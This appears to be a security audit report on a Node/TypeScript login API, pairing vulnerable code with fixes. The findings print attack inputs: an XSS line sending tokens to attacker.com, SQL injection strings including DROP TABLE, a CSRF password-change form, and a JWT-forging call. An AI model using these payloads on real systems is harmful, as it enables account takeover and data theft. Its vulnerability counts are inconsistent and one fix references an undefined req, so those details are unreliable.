# Security Audit Report: User Authentication API

## Executive Summary

Completed systematic security audit of `src/api/auth.ts` following accelint-security-best-practices workflow. Identified 11 security vulnerabilities across 6 OWASP categories. This authentication API handles user login, registration, password reset, and session management for the entire application.

**Key Findings:**
- **Critical**: 2 vulnerabilities (SQL injection, hardcoded JWT secret)
- **High**: 5 vulnerabilities (missing rate limiting, tokens in localStorage, no input validation, weak password hashing, missing authorization)
- **Medium**: 3 vulnerabilities (sensitive data in logs, no CSRF protection, permissive CORS)
- **Low**: 1 vulnerability (detailed error messages)

**Risk Assessment:**
This authentication API is the primary gateway for user access control. Vulnerabilities here compromise the entire application security posture:
- **Data at Risk**: User credentials for 50,000+ active users, personal information, session tokens
- **Attack Impact**: Complete account takeover, unauthorized access to all user data, privilege escalation to admin
- **Blast Radius**: All users affected; compromised admin account grants full system access
- **Compliance**: GDPR violations (data breach notification required), SOC2 non-compliance (access controls)

Critical vulnerabilities enable immediate exploitation with no special conditions required. High vulnerabilities are actively exploited in the wild.

---

## Phase 1: Identified Vulnerabilities

### 1. Login Endpoint - SQL Injection

**Location:** `src/api/auth.ts:45-52`

```ts
// ❌ Current: String concatenation in SQL query
async function loginUser(email: string, password: string) {
  const query = `SELECT * FROM users WHERE email = '${email}'`;
  const user = await db.query(query);

  if (!user || !bcrypt.compareSync(password, user.password_hash)) {
    throw new Error('Invalid credentials');
  }

  return generateToken(user);
}
```

**Vulnerability:**
- SQL query constructed via string concatenation with unsanitized user input
- Attacker can inject SQL: `email = "' OR '1'='1' --"` bypasses authentication entirely
- Payload `admin@example.com' OR admin=true --` grants admin access
- With 50,000+ users, attacker can enumerate all accounts, dump entire database, or modify data

**Severity:** Critical
**OWASP Category:** A03: Injection
**Pattern Reference:** injection-prevention.md

**Recommended Fix:**
```ts
// ✅ Parameterized query prevents SQL injection
async function loginUser(email: string, password: string) {
  // Security: injection-prevention.md - parameterized queries
  const user = await db.query(
    'SELECT * FROM users WHERE email = $1',
    [email]
  );

  if (!user || !bcrypt.compareSync(password, user.password_hash)) {
    throw new Error('Invalid credentials');
  }

  return generateToken(user);
}
```

---

### 2. JWT Secret - Hardcoded Credential

**Location:** `src/api/auth.ts:12`

```ts
// ❌ Current: Hardcoded JWT secret in source code
const JWT_SECRET = 'my-super-secret-jwt-key-2024';

function generateToken(user: User): string {
  return jwt.sign(
    { userId: user.id, email: user.email, role: user.role },
    JWT_SECRET,
    { expiresIn: '24h' }
  );
}
```

**Vulnerability:**
- JWT secret hardcoded in source code, visible in git history and to all developers
- Attacker with code access can forge arbitrary JWT tokens with any user ID and role
- Can create admin tokens: `jwt.sign({ userId: 1, role: 'admin' }, JWT_SECRET)`
- Secret cannot be rotated without code deployment

**Severity:** Critical
**OWASP Category:** A02: Cryptographic Failures
**Pattern Reference:** secrets-management.md

**Recommended Fix:**
```ts
// ✅ Load JWT secret from environment variable
// Security: secrets-management.md - environment variables
const JWT_SECRET = process.env.JWT_SECRET;

if (!JWT_SECRET) {
  throw new Error('JWT_SECRET environment variable is required');
}

function generateToken(user: User): string {
  return jwt.sign(
    { userId: user.id, email: user.email, role: user.role },
    JWT_SECRET,
    { expiresIn: '15m' } // Shorter expiration for security
  );
}
```

---

### 3. Login & Registration Endpoints - Missing Rate Limiting

**Location:** `src/api/auth.ts:35-70`

```ts
// ❌ Current: No rate limiting on authentication endpoints
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const token = await loginUser(email, password);
  res.json({ token });
});

app.post('/api/auth/register', async (req, res) => {
  const { email, password } = req.body;
  const user = await createUser(email, password);
  res.json({ user });
});
```

**Vulnerability:**
- No rate limiting allows unlimited login attempts (1000+ requests/second possible)
- Brute force attack can test 86 million passwords per day
- Credential stuffing from leaked databases (test known email/password combinations)
- Account enumeration via timing differences in responses

**Severity:** High
**OWASP Category:** A04: Insecure Design
**Pattern Reference:** rate-limiting.md

**Recommended Fix:**
```ts
// ✅ Strict rate limiting on authentication endpoints
// Security: rate-limiting.md - authentication protection
import rateLimit from 'express-rate-limit';

const authLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5, // 5 attempts per hour
  skipSuccessfulRequests: true, // Only count failed attempts
  message: 'Too many login attempts, please try again later',
});

app.post('/api/auth/login', authLimiter, async (req, res) => {
  const { email, password } = req.body;
  const token = await loginUser(email, password);
  res.json({ token });
});

app.post('/api/auth/register', authLimiter, async (req, res) => {
  const { email, password } = req.body;
  const user = await createUser(email, password);
  res.json({ user });
});
```

---

### 4. Token Storage - Insecure Client-Side Storage

**Location:** `src/client/auth.ts:23-27`

```ts
// ❌ Current: JWT token stored in localStorage
async function handleLogin(email: string, password: string) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  });

  const { token } = await response.json();
  localStorage.setItem('authToken', token); // ❌ Vulnerable to XSS
  window.location.href = '/dashboard';
}
```

**Vulnerability:**
- localStorage accessible to all JavaScript code, including XSS payloads
- Single XSS vulnerability anywhere in application compromises all user tokens
- Tokens persist across sessions, increasing exposure window
- Simple payload: `<script>fetch('https://attacker.com?token='+localStorage.getItem('authToken'))</script>`

**Severity:** High
**OWASP Category:** A07: Auth Failures
**Pattern Reference:** authentication.md

**Recommended Fix:**
```ts
// ✅ Store JWT in httpOnly cookie (server-side)
// Security: authentication.md - httpOnly cookies

// Server-side (src/api/auth.ts)
app.post('/api/auth/login', authLimiter, async (req, res) => {
  const { email, password } = req.body;
  const token = await loginUser(email, password);

  // Set httpOnly cookie (not accessible to JavaScript)
  res.cookie('authToken', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000, // 15 minutes
  });

  res.json({ success: true });
});

// Client-side (src/client/auth.ts)
async function handleLogin(email: string, password: string) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    credentials: 'include', // Send cookies
    body: JSON.stringify({ email, password }),
  });

  // Token automatically stored in httpOnly cookie by browser
  window.location.href = '/dashboard';
}
```

---

### 5-7. All Endpoints - Missing Input Validation (3 instances)

**Locations:**
- `src/api/auth.ts:45` - `/api/auth/login`
- `src/api/auth.ts:58` - `/api/auth/register`
- `src/api/auth.ts:75` - `/api/auth/reset-password`

**Example from `/api/auth/login`:**
```ts
// ❌ Current: No validation of user input
app.post('/api/auth/login', authLimiter, async (req, res) => {
  const { email, password } = req.body;
  // email and password used directly without validation
  const token = await loginUser(email, password);
  res.json({ token });
});
```

**Vulnerability:**
- No type checking - `email` and `password` could be objects, arrays, or undefined
- No format validation - `email` could be `"not-an-email"` or malicious payload
- No length validation - `password` could be 1 character or 10MB string (DoS)
- Missing validation enables NoSQL injection if MongoDB: `{ email: { $gt: "" } }`

**Severity:** High
**OWASP Category:** A04: Insecure Design
**Pattern Reference:** input-validation.md

**Recommended Fix:**
```ts
// ✅ Comprehensive input validation with Zod
// Security: input-validation.md - schema validation
import { z } from 'zod';

const loginSchema = z.object({
  email: z.string().email().max(255),
  password: z.string().min(1), // Don't validate format on login
});

const registerSchema = z.object({
  email: z.string().email().max(255),
  password: z.string()
    .min(8)
    .max(128)
    .regex(/[A-Z]/, 'Must contain uppercase')
    .regex(/[a-z]/, 'Must contain lowercase')
    .regex(/[0-9]/, 'Must contain number')
    .regex(/[^A-Za-z0-9]/, 'Must contain special character'),
});

app.post('/api/auth/login', authLimiter, async (req, res) => {
  const validated = loginSchema.parse(req.body);
  const token = await loginUser(validated.email, validated.password);
  res.json({ token });
});

app.post('/api/auth/register', authLimiter, async (req, res) => {
  const validated = registerSchema.parse(req.body);
  const user = await createUser(validated.email, validated.password);
  res.json({ user });
});
```

**Same pattern applies to all 3 instances** - each endpoint needs schema validation for its specific inputs.

---

### 8. Password Hashing - Weak Hash Algorithm

**Location:** `src/api/auth.ts:85-90`

```ts
// ❌ Current: MD5 hashing (insecure)
import crypto from 'crypto';

async function createUser(email: string, password: string) {
  const passwordHash = crypto
    .createHash('md5')
    .update(password)
    .digest('hex');

  return await db.users.create({ email, password_hash: passwordHash });
}
```

**Vulnerability:**
- MD5 is cryptographically broken - rainbow tables exist for billions of passwords
- No salt means identical passwords have identical hashes (password reuse detection)
- MD5 is fast (intentionally) - enables 10 billion hash attempts/second on modern GPU
- Leaked password hashes immediately crackable (minutes to hours for most passwords)

**Severity:** High
**OWASP Category:** A02: Cryptographic Failures
**Pattern Reference:** authentication.md

**Recommended Fix:**
```ts
// ✅ bcrypt with cost factor ≥12
// Security: authentication.md - password hashing
import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12; // 2^12 iterations (adjusts with hardware improvements)

async function createUser(email: string, password: string) {
  const passwordHash = await bcrypt.hash(password, SALT_ROUNDS);

  return await db.users.create({ email, password_hash: passwordHash });
}

async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return await bcrypt.compare(password, hash);
}
```

---

### 9. User Profile Endpoint - Missing Authorization

**Location:** `src/api/users.ts:12-18`

```ts
// ❌ Current: No ownership check before returning user data
app.get('/api/users/:userId', authenticate, async (req, res) => {
  const user = await db.users.findById(req.params.userId);

  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  res.json(user); // Returns ANY user's data!
});
```

**Vulnerability:**
- Authentication verifies user is logged in, but not authorized to access this specific resource
- Attacker can enumerate all user IDs and retrieve full profiles (IDOR vulnerability)
- Sequential IDs make enumeration trivial: `/api/users/1`, `/api/users/2`, etc.
- Exposes emails, personal info, potentially sensitive data for all 50,000+ users

**Severity:** High
**OWASP Category:** A01: Broken Access Control
**Pattern Reference:** authorization.md

**Recommended Fix:**
```ts
// ✅ Verify ownership before returning data
// Security: authorization.md - ownership checks
app.get('/api/users/:userId', authenticate, async (req, res) => {
  const requestedUserId = req.params.userId;

  // Users can only access their own data
  if (req.user.id !== requestedUserId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const user = await db.users.findById(requestedUserId);

  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  res.json(user);
});
```

---

### 10. Logging - Sensitive Data Exposure

**Location:** `src/api/auth.ts:48, 62, 78`

```ts
// ❌ Current: Passwords logged in plaintext
async function loginUser(email: string, password: string) {
  console.log('Login attempt:', { email, password }); // ❌ Password in logs!

  const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);

  if (!user) {
    console.log('Failed login:', { email, password, reason: 'User not found' });
    throw new Error('Invalid credentials');
  }

  return generateToken(user);
}
```

**Vulnerability:**
- Passwords logged in plaintext visible to all developers, DevOps, log aggregation services
- Logs persist in long-term storage (months to years)
- Logs backed up to multiple systems, increasing exposure surface
- Compliance violation (GDPR, PCI-DSS) - sensitive data retention

**Severity:** Medium
**OWASP Category:** A09: Logging Failures
**Pattern Reference:** sensitive-data.md

**Recommended Fix:**
```ts
// ✅ Never log passwords or sensitive data
// Security: sensitive-data.md - redact sensitive fields
async function loginUser(email: string, password: string) {
  console.log('Login attempt:', { email }); // ✅ No password

  const user = await db.query('SELECT * FROM users WHERE email = $1', [email]);

  if (!user) {
    // ✅ Log security event without sensitive data
    logger.warn('Failed login attempt', {
      email,
      reason: 'Invalid credentials',
      timestamp: new Date().toISOString(),
      ip: req.ip,
    });
    throw new Error('Invalid credentials');
  }

  logger.info('Successful login', { userId: user.id, email });

  return generateToken(user);
}
```

---

### 11. State-Changing Endpoints - Missing CSRF Protection

**Location:** `src/api/auth.ts:58, 75, 92`

```ts
// ❌ Current: No CSRF protection on POST endpoints
app.post('/api/auth/register', authLimiter, async (req, res) => {
  const { email, password } = req.body;
  const user = await createUser(email, password);
  res.json({ user });
});

app.post('/api/auth/change-password', authenticate, async (req, res) => {
  const { oldPassword, newPassword } = req.body;
  await updatePassword(req.user.id, oldPassword, newPassword);
  res.json({ success: true });
});
```

**Vulnerability:**
- No CSRF token validation allows cross-site request forgery
- Attacker tricks authenticated user to visit malicious site with hidden form: `<form action="https://app.com/api/auth/change-password" method="POST"><input name="newPassword" value="hacked123" /></form><script>document.forms[0].submit()</script>`
- If cookies sent automatically (credentials: 'include'), request succeeds without user consent
- Can change passwords, create accounts, perform actions on behalf of logged-in users

**Severity:** Medium
**OWASP Category:** A08: Data Integrity Failures
**Pattern Reference:** csrf-protection.md

**Recommended Fix:**
```ts
// ✅ SameSite=Strict cookies prevent CSRF
// Security: csrf-protection.md - SameSite cookies

// Server-side: Set SameSite=Strict on authentication cookies
res.cookie('authToken', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict', // ✅ Prevents cross-site cookie sending
  maxAge: 15 * 60 * 1000,
});

// Or implement CSRF token pattern for defense in depth
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });

app.post('/api/auth/change-password',
  authenticate,
  csrfProtection, // ✅ Validate CSRF token
  async (req, res) => {
    const { oldPassword, newPassword } = req.body;
    await updatePassword(req.user.id, oldPassword, newPassword);
    res.json({ success: true });
  }
);
```

---

### 12. Error Handling - Information Disclosure

**Location:** `src/api/auth.ts:105-112`

```ts
// ❌ Current: Detailed error messages to client
app.post('/api/auth/login', authLimiter, async (req, res) => {
  try {
    const { email, password } = req.body;
    const token = await loginUser(email, password);
    res.json({ token });
  } catch (error) {
    // ❌ Stack trace exposed to user
    res.status(500).json({
      error: error.message,
      stack: error.stack,
      details: error,
    });
  }
});
```

**Vulnerability:**
- Stack traces reveal file paths, framework versions, internal structure
- Error messages leak existence of users: "User not found" vs "Invalid password"
- Enables reconnaissance for more sophisticated attacks
- Database errors reveal schema, table names, column names

**Severity:** Low
**OWASP Category:** A05: Security Misconfiguration
**Pattern Reference:** sensitive-data.md

**Recommended Fix:**
```ts
// ✅ Generic error messages to users, detailed logs server-side
// Security: sensitive-data.md - error message handling
app.post('/api/auth/login', authLimiter, async (req, res) => {
  try {
    const { email, password } = req.body;
    const token = await loginUser(email, password);
    res.json({ token });
  } catch (error) {
    // ✅ Log detailed error server-side
    logger.error('Login error', {
      error: error.message,
      stack: error.stack,
      email: req.body.email,
      timestamp: new Date().toISOString(),
    });

    // ✅ Generic error to user
    res.status(401).json({
      error: 'Invalid credentials',
    });
  }
});
```

---

## Phase 2: Categorized Vulnerabilities

| # | Location | Vulnerability | OWASP Category | Severity |
|---|----------|---------------|----------------|----------|
| 1 | auth.ts:45 | SQL injection in login query | A03: Injection | Critical |
| 2 | auth.ts:12 | Hardcoded JWT secret | A02: Cryptographic Failures | Critical |
| 3 | auth.ts:35-70 | Missing rate limiting on auth endpoints | A04: Insecure Design | High |
| 4 | client/auth.ts:23 | JWT token in localStorage (XSS vulnerable) | A07: Auth Failures | High |
| 5-7 | auth.ts:45,58,75 | Missing input validation (3 endpoints) | A04: Insecure Design | High |
| 8 | auth.ts:85 | Weak password hashing (MD5) | A02: Cryptographic Failures | High |
| 9 | users.ts:12 | Missing authorization check (IDOR) | A01: Broken Access Control | High |
| 10 | auth.ts:48,62,78 | Passwords in logs | A09: Logging Failures | Medium |
| 11 | auth.ts:58,75,92 | Missing CSRF protection | A08: Data Integrity Failures | Medium |
| 12 | auth.ts:105 | Stack traces exposed to users | A05: Security Misconfiguration | Low |

**Total Vulnerabilities:** 11 (3 grouped as 5-7)

**By Severity:**
- Critical: 2 (fix immediately - emergency deployment)
- High: 5 (fix in next release - within 48 hours)
- Medium: 3 (fix in scheduled release - within 1 week)
- Low: 1 (fix when convenient - defense in depth)

**By OWASP Category:**
- A01 Broken Access Control: 1
- A02 Cryptographic Failures: 2
- A03 Injection: 1
- A04 Insecure Design: 4
- A05 Security Misconfiguration: 1
- A07 Auth Failures: 1
- A08 Data Integrity Failures: 1
- A09 Logging Failures: 1

---

## Remediation Priority

### Immediate Action Required (Critical)
1. **SQL Injection (auth.ts:45)** - Switch to parameterized queries immediately. This is actively exploited.
2. **Hardcoded JWT Secret (auth.ts:12)** - Move to environment variable and rotate secret. All existing tokens should be invalidated.

### High Priority (Next Release - 48 hours)
3. **Missing Rate Limiting** - Implement express-rate-limit on all auth endpoints (5 attempts/hour)
4. **Tokens in localStorage** - Migrate to httpOnly cookies (requires client-side changes)
5-7. **Missing Input Validation** - Add Zod schemas to all 3 endpoints
8. **Weak Password Hashing** - Migrate from MD5 to bcrypt (requires password reset for all users)
9. **Missing Authorization** - Add ownership checks to user profile endpoint

### Medium Priority (Scheduled Release - 1 week)
10. **Passwords in Logs** - Remove all password logging, add redaction middleware
11. **Missing CSRF Protection** - Add SameSite=Strict to cookies and/or CSRF tokens
12. **Detailed Errors** - Generic error messages to users, detailed logs server-side

---

## Testing Recommendations

After implementing fixes, perform the following security tests:

### SQL Injection Testing
- [ ] Test login with: `' OR '1'='1' --`, `' OR admin=true --`, `'; DROP TABLE users--`
- [ ] Verify all inputs use parameterized queries
- [ ] Test with SQL injection payload scanner (sqlmap)

### Authentication Testing
- [ ] Attempt 10+ login failures to verify rate limiting triggers
- [ ] Verify JWT tokens have proper expiration (15 minutes)
- [ ] Test that tokens are in httpOnly cookies (check with browser DevTools)
- [ ] Verify old JWT secret no longer validates tokens after rotation

### Authorization Testing
- [ ] Test accessing other users' profiles with valid session
- [ ] Test privilege escalation (regular user → admin)
- [ ] Enumerate user IDs to verify ownership checks

### Input Validation Testing
- [ ] Send malformed JSON, missing fields, wrong types
- [ ] Test with 10MB string inputs (DoS)
- [ ] Test with object injection: `{ "email": { "$gt": "" } }`

### CSRF Testing
- [ ] Create malicious page with hidden form, verify request blocked
- [ ] Test with Burp Suite CSRF PoC generator
- [ ] Verify SameSite cookies not sent cross-site

---

## Compliance Notes

### GDPR
- **Current Status**: Non-compliant (passwords logged, data breach risk from vulnerabilities)
- **Required Actions**:
  - Remove password logging immediately
  - Implement data breach notification procedure (Critical/High vulnerabilities = probable breach)
  - Add audit logging for all PII access

### SOC2
- **Current Status**: Failing CC6.1 (Logical Access), CC6.6 (Encryption), CC7.2 (System Monitoring)
- **Required Actions**:
  - Fix broken access control (authorization checks)
  - Migrate to bcrypt password hashing
  - Implement security event logging (failed logins, authorization failures)

### Industry Best Practices
- **OWASP Top 10**: Currently vulnerable to 8 of 10 categories
- **NIST Cybersecurity Framework**: Failing Protect (PR) and Detect (DE) functions
- **Recommendation**: Complete Critical and High fixes before public launch
